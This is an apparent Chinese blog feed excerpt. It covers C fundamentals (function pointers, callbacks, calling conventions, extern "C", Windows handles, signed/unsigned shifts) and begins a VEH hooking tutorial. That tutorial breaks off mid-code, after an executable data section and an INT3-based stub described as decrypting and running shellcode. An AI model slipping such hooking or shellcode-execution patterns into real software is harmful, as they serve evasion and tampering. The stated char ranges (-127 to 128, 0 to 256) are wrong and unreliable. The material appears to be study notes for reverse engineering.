    <content type="html"><![CDATA[<p>一些基础知识的补充</p><span id="more"></span> <h1 id="0x00-typedef定义函数指针"><a class="header-anchor" href="#0x00-typedef定义函数指针">¶</a>0x00-typedef定义函数指针</h1><h2 id="函数指针"><a class="header-anchor" href="#函数指针">¶</a>函数指针</h2><p>在此之前我们要先了解函数指针，即存放函数首地址的变量，而函数名就是函数的首地址，为了存放函数的首地址就需要定义函数指针</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is hello!"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//函数指针定义</span></span><br><span class="line"><span class="keyword">void</span> (*fp)()=hello;<span class="comment">//函数指针定义时应保证函数返回值与参数个数、类型相同，在这里void是返回类型，(*fp)后面的()是函数参数</span></span><br><span class="line"><span class="comment">/*也可以理解为</span></span><br><span class="line"><span class="comment">void (*fp)();</span></span><br><span class="line"><span class="comment">fp=hello;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过函数指针调用函数</span></span><br><span class="line">fp();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数指针定义,形参可以不写变量名</span></span><br><span class="line"><span class="keyword">int</span> (*fp1)(<span class="keyword">int</span>,<span class="keyword">int</span>)=add;</span><br><span class="line"><span class="comment">//函数调用</span></span><br><span class="line">fp1(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="typedef与函数指针混合使用"><a class="header-anchor" href="#typedef与函数指针混合使用">¶</a>typedef与函数指针混合使用</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FP)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>那么我们在赋值的时候就可以改成</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FP fp1=add;<span class="comment">//fp1就是返回值为int型，参数为两个int型的函数指针，FP表示函数指针的类型，通过类型名+变量名就可以定义函数指针</span></span><br><span class="line">fp1(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><h1 id="0x01-回调函数"><a class="header-anchor" href="#0x01-回调函数">¶</a>0x01-回调函数</h1><h2 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h2><p>如果函数的参数具有函数指针，那么这样的函数就被称为回调函数</p><p>函数指针就是当作接口使用的</p><h2 id="例子-v2"><a class="header-anchor" href="#例子-v2">¶</a>例子</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的call就是回调函数,这里传递函数指针和我们传入数组时使用函数指针是类似的，都是使用指针将首地址进行传递，而不是传整个函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">(<span class="keyword">void</span>(*fp)())</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    fp();<span class="comment">//这样调用的时候就不需要考虑函数指针的变量名，只要传递的函数是这样类型的即可在call函数中进行调用</span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//当然也可以使用typedef，让回调函数更简洁</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">(fp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    fp();</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"show"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//如果不使用回调函数，调用时需要hello();show();</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    call(show);</span><br><span class="line">    call(hello);<span class="comment">//使用回调函数调用，这样只需要传入不同参数即可完成调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x02-复杂函数"><a class="header-anchor" href="#0x02-复杂函数">¶</a>0x02-复杂函数</h1><p>定义复杂的回调函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">handle</span><span class="params">(<span class="keyword">void</span>*arg)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"arg is %X\n"</span>,arg);</span><br><span class="line">    <span class="keyword">return</span> arg;<span class="comment">//返回值是void*</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们要定义一个参数为函数指针，返回值为函数指针的回调函数</span></span><br><span class="line"><span class="comment">//先来看参数，传入函数指针void* (*fp)(void *),另一个还要传入的是arg，这里定义为void*p</span></span><br><span class="line"><span class="comment">//然后再定义一个以上面两个参数为函数参数，返回值是函数指针(这里是handle函数指针)的函数</span></span><br><span class="line"><span class="keyword">void</span> *(*call(<span class="keyword">void</span> *(fp)(<span class="keyword">void</span>*),<span class="keyword">void</span>*p))(<span class="keyword">void</span> *)<span class="comment">//在这里call是回调函数的变量名，void*是返回值，最后的(void*)是返回的函数指针的参数，call()里的两个是回调函数的参数</span></span><br><span class="line">{</span><br><span class="line">    fp(p);</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">void</span>*(*fp)(<span class="keyword">void</span>*)=call(handle,&amp;num);<span class="comment">//使用对应类型的函数指针接收</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//为了方便理解，使用typedef</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>*(*FP)(<span class="keyword">void</span>*);</span><br><span class="line"><span class="function">FP <span class="title">call</span><span class="params">(FP fp1,<span class="keyword">void</span>*p)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    fp1(p);</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x03-一维数组内存"><a class="header-anchor" href="#0x03-一维数组内存">¶</a>0x03-一维数组内存</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">6</span>]={<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>};<span class="comment">//当有初始值时，剩余没定义的默认为0，如果没有定义初始值，则为随机值</span></span><br></pre></td></tr></tbody></table></figure><p>因为数组长度定义为6，类型为int，所以在内存中分配24个字节</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649861619368.png" alt="数组在栈中的存储"></p><h1 id="0x04-函数声明"><a class="header-anchor" href="#0x04-函数声明">¶</a>0x04-函数声明</h1><p>返回值+函数名+参数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649862553289.png" alt="原因"></p><h1 id="0x05-调用约定"><a class="header-anchor" href="#0x05-调用约定">¶</a>0x05-调用约定</h1><p>为什么要有不同的调用约定——是因为调用函数之后需要清理栈，而不同的调用约定对应不同的清理方式</p><blockquote><p>__cdecl：调用者自己清理栈</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数外部</span></span><br><span class="line">call hello;函数</span><br><span class="line">add esp,立即数</span><br></pre></td></tr></tbody></table></figure><p>__stdcall：函数自己清理栈</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数内部</span></span><br><span class="line">retn 立即数</span><br></pre></td></tr></tbody></table></figure></blockquote><p>如果使用__cdcel调用方式，因为不同编译器产生的栈不同，所以不能很好地清理栈，而stdcall则可以在函数内部完成清理栈。</p><blockquote><p><strong>所以，在跨（开发）平台的调用中，我们都使用stdcall（有时是以WINAPI的样子出现）。那么为什么还需要_cdecl呢？当我们遇到这样的函数如fprintf()它的参数是可变的，不定长的，被调用者事先无法知道参数的长度，事后的清除工作也无法正常的进行，因此，这种情况我们只能使用cdecl</strong></p></blockquote><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898026998.png" alt=""></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898651751.png" alt=""></p><h1 id="0x06-extern-“C”"><a class="header-anchor" href="#0x06-extern-“C”">¶</a>0x06-extern “C”</h1><h2 id="原因"><a class="header-anchor" href="#原因">¶</a>原因</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898161708.png" alt=""></p><p>也就是说如果不声明为extern “C”，我们导出的函数名会被修饰</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898480365.png" alt="DLL代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898496934.png" alt="导出的函数名称"></p><p>可以看到我们的函数名被修饰了，在调用的时候我们无法通过GetProcAddress通过函数名调用</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898566926.png" alt="代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898581787.png" alt="导出的函数名称"></p><p>可以看到我们的函数名没有被修饰</p><blockquote><p><strong>C++函数重载即函数名可以相等，只要该函数的参数类型或者个数不同即可</strong></p></blockquote><h2 id="补充"><a class="header-anchor" href="#补充">¶</a>补充</h2><p>标准文件头</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __INCvxWorksh  <span class="comment">/*防止该头文件被重复引用*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __INCvxWorksh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus    <span class="comment">//__cplusplus是cpp中自定义的一个宏</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> {          <span class="comment">//告诉编译器，这部分代码按C语言的格式进行编译，而不是C++的</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**** some declaration or so *****/</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __INCvxWorksh */</span></span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>extern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用</p></blockquote><h1 id="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"><a class="header-anchor" href="#0x07-HMOUDLE、HANDLE、HWND、HINSTANCE">¶</a>0x07-HMOUDLE、HANDLE、HWND、HINSTANCE</h1><p><a href="https://www.cnblogs.com/wingsummer/p/15823780.html">https://www.cnblogs.com/wingsummer/p/15823780.html</a></p><p>这里就不看定义了，越看越晕（</p><h2 id="HWND"><a class="header-anchor" href="#HWND">¶</a>HWND</h2><p>HWND是线程相关的，可以通过HWND找到该窗口所属进程的句柄</p><h2 id="HANDLE"><a class="header-anchor" href="#HANDLE">¶</a>HANDLE</h2><p>Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄</p><blockquote><p><strong>系统对内核对象以链表的形式进行管理，载入到内存中的内核对象都有一个线性地址，同时相对系统来说，在串列中有一个索引位置，这个索引位置就是内核对象的HANDLE</strong></p></blockquote><h2 id="HINSTANCE"><a class="header-anchor" href="#HINSTANCE">¶</a>HINSTANCE</h2><p>HINSTANCE的本质是模块基地址，它仅在同一进程中才有意义，跨进程的HINSTANCE是没有意义的</p><h2 id="HMODULE"><a class="header-anchor" href="#HMODULE">¶</a>HMODULE</h2><blockquote><p><strong>代表应用程序载入的模块，WIN32系统下通常是被载入模块的线性地址，比如exe, dll等模块等</strong></p></blockquote><blockquote><p>HINSTANCE 在win32下与HMODULE是相同的东西(只有在16位windows上，二者有所不同)</p></blockquote><h1 id="0x08-命令行参数"><a class="header-anchor" href="#0x08-命令行参数">¶</a>0x08-命令行参数</h1><p>我们知道main函数实际上是有两个参数的，但一般不会进行使用</p><p>其原型如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008765976.png" alt=""></p><p>这两个参数实际上与命令行相关</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//argc是一个整数，其代表了命令行参数个数</span></span><br><span class="line"><span class="comment">//argv是一个指针数组，可以接收多个参数，第一个也就是argv[0]指向输入的程序路径及名称</span></span><br><span class="line"><span class="comment">//如果在命令行中运行，argc为1，也就是只有一个参数</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008701868.png" alt=""></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"命令行参数个数为：%d\n"</span>, argc);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第%d个命令行参数为：%s\n"</span>, i, argv[i]);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="有符号数和无符号数"><a class="header-anchor" href="#有符号数和无符号数">¶</a>有符号数和无符号数</h1><h2 id="unsigend和signed"><a class="header-anchor" href="#unsigend和signed">¶</a>unsigend和signed</h2><p>unsigned顾名思义就是无符号数，signed是有符号数</p><p>我们以char为例，char类型存储时为8位，当声明为signed的时候（不加unsigned的时候），最高位也就是第八位被当作符号位，当最高位为0的时候为正数，1时为负数，那么后七位就是数据位</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650504748332.png" alt=""></p><p>所以signed char也就是char可以表示-127-128的值（2**7）</p><p>当声明为unsigned char时，最高位也是数据位，此时可以表示0-256中的数据（2**8）</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650505930033.png" alt=""></p><h2 id="有符号数与无符号数的移位问题"><a class="header-anchor" href="#有符号数与无符号数的移位问题">¶</a>有符号数与无符号数的移位问题</h2><blockquote><p><strong>逻辑移位用于无符号数<br>算术移位用于有符号数</strong></p></blockquote><h3 id="逻辑移位"><a class="header-anchor" href="#逻辑移位">¶</a>逻辑移位</h3><p>对于逻辑移位，就是不考虑符号位，移位的结果只是数据所有的位数进行移位，左移时低位补0，右移时高位补0</p><h3 id="算术移位"><a class="header-anchor" href="#算术移位">¶</a>算术移位</h3><p>首先我们需要知道</p><blockquote><p><strong>C在存储数字的时候都采用补码的形式，而正数的原码、反码、补码都是一样的，左右移位时直接使用原码即可，负数的需要重新计算，补码计算：除符号位外，其他取反加一</strong></p></blockquote><p>算术移位，右移时（未溢出），保持符号位不变，同时用符号位补数值最高位</p><p>-65=11000001，转为补码为10111111，&gt;&gt;2变成11101111，再转为原码10010001，为-17</p><p>算术移位，左移时（未溢出），<strong>直接将数据最高有效位移入符号位，最低位补0</strong></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650505897036.png" alt=""></p><p>当符号位为1时，为负数，若数据最高位为0（补码的数据最高位），那么此时左移必定溢出，正数也同理</p><h1 id="整型溢出与左移溢出"><a class="header-anchor" href="#整型溢出与左移溢出">¶</a>整型溢出与左移溢出</h1><h2 id="整型溢出"><a class="header-anchor" href="#整型溢出">¶</a>整型溢出</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650515001470.png" alt="无符号数整型溢出"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650515080645.png" alt="有符号数溢出"></p><p>0x7F就是01111111，也就是127，+1之后过渡到0x80，此时为1000000，也就是负数，该值为负数的最小值也就是-128</p><h2 id="左移溢出"><a class="header-anchor" href="#左移溢出">¶</a>左移溢出</h2><blockquote><p>左移和右移运算过程中也会发生溢出，移位位数并不是可以任意。当移位位数超过该数值类型的最大位数时，编译器会用移位位数去模该类型位数，然后按照余数进行移位。</p></blockquote><h1 id="循环左移与循环右移"><a class="header-anchor" href="#循环左移与循环右移">¶</a>循环左移与循环右移</h1><p>循环移位区别于一般的移位时没有数位的丢失</p><blockquote><p><strong>循环左移时，用从左边移出的位填充字的右端；循环右移时，用从右边移出的位填充字的左端</strong></p></blockquote><p>以（unsigned char）0x51（无符号）为例，二进制为01010001，循环左移三位最终应该得到10001010，所以我们要先把前三位取出放置到最后三位，把最后五位前移，最后按位或，实现代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="number">0x51</span>&lt;&lt;<span class="number">3</span>)|(<span class="number">0x51</span>&gt;&gt;<span class="number">5</span>))</span><br></pre></td></tr></tbody></table></figure><p>01010001000+</p><p>00000000010</p><p>01010001010，因为最后要截断，需要&amp;0xFF</p><blockquote><p><strong>要注意的是有符号数的循环右移时，使用符号位填充</strong></p></blockquote><blockquote><p><strong>通用，总长度N(8,16,32)，循环左移n：(a&gt;&gt;(N-n))|(a&lt;&lt;n)，循环右移n：(a&lt;&lt;(N-n))|(a&gt;&gt;n)</strong></p></blockquote><h2 id="逆运算"><a class="header-anchor" href="#逆运算">¶</a>逆运算</h2><p>只需要将&lt;&lt;改为&gt;&gt;，&gt;&gt;改为&lt;&lt;即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一些基础知识的补充&lt;/p&gt;</summary>
    
    
    
    
    <category term="C" scheme="https://gift1a.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>VEH</title>
    <link href="https://gift1a.github.io/2022/04/10/VEH/"/>
    <id>https://gift1a.github.io/2022/04/10/VEH/</id>
    <published>2022-04-10T09:23:53.000Z</published>
    <updated>2022-04-20T05:31:40.862Z</updated>
    
    <content type="html"><![CDATA[<p>VEH</p> <span id="more"></span> <h1 id="0x00-VEH"><a class="header-anchor" href="#0x00-VEH">¶</a>0x00-VEH</h1><p>VEH的中文名字为：向量化异常处理 （Vectored Exception Handling） ，是为操作系统提供的异常处理机制，类似于SEH，VEH的优先级高于SEH</p><p><img src="/2022/04/10/VEH/592902_92wf161s7cgif01.png" alt="应用层异常处理结构图"></p><h1 id="0x01-VEH回调函数详解"><a class="header-anchor" href="#0x01-VEH回调函数详解">¶</a>0x01-VEH回调函数详解</h1><blockquote><p>VEH由AddVectorExceptionHandler添加处理函数，处理函数有一个参数</p><p>参数类型为PEXCEPTION_POINTERS结构体</p><p>结构PEXCEPTION_POINTERS保存着当前异常的各个寄存器，堆栈，地址等多种信息</p></blockquote><p><img src="/2022/04/10/VEH/592902_cvh37cwxtybvmyq.png" alt="pEXCEPTION_POINTER"></p><h1 id="0x02-VEH-Hook原理"><a class="header-anchor" href="#0x02-VEH-Hook原理">¶</a>0x02-VEH Hook原理</h1><blockquote><p>1、异常处理结构中，VEH是唯一一个可以接收到所有异常信息的处理。换句话说：所有的异常信息都会经过VEH</p><p>2、异常信息通常是由数组越界、内存访问出错、无效参数、int 3等造成的</p><p>3、一旦发生异常，操作系统会立即遍历VEH，如果有处理函数，中断线程，并由处理函数处理</p></blockquote><p>思路</p><p>如果我们要Hook消息框，首先要给API的首地址写入int 3断点，当执行时会产生异常，线程暂停，转交给异常处理函数处理，此时我们可以在处理函数中修改堆栈参数等</p><p>相应操作完成后将int 3(0xCC)修改回源代码 修改EIP=addr(异常地址)，然后让此处的代码重新执行一次正确的代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"ldata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> trapcode[] = <span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> llcode = <span class="number">204</span>;<span class="comment">//CC 00 00 00INT3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:ldata,RWE"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">llcode = <span class="number">0xF333333333333333</span>;</span><br><span class="line">llcode &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>* data = (<span class="keyword">char</span>*)&amp;llcode;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 解密shellcode 并且执行</span></span><br><span class="line"><span class="comment">* len 解密后的指令长度</span></span><br><span class="line"><span class="comment">* data 把解密后的指令写入data</span></span><br><span class="line"><span class="comment">* 比如 push ebp 就向data写入0x55</span></span><br><span class="line"><span class="comment">* 每次解密一条指令 不要用超过7字节的指令和跳转指令</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打辣"</span>, <span class="string">"停下"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandle</span><span class="params">(PEXCEPTION_POINTERS val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//判断是否为int3断点</span></span><br><span class="line"><span class="keyword">if</span> 